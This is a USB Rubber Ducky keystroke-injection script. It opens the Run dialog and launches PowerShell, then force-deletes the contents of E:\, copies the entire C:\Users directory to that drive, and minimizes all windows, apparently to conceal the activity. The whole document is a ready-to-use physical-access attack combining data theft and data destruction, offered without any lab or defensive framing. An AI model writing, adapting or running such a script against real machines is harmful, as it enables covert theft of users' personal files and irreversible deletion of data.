REM Ducky Script
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING $sourceFolder = C:\Users; $destinationFolder = E:\; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Remove-Item -Path $destinationFolder -Recurse -Force; Copy-Item -Path $sourceFolder -Destination $destinationFolder -Container -Force
ENTER
DELAY 500
STRING $shell = New-Object -com WScript.Shell; $shell.MinimizeAll()
ENTER
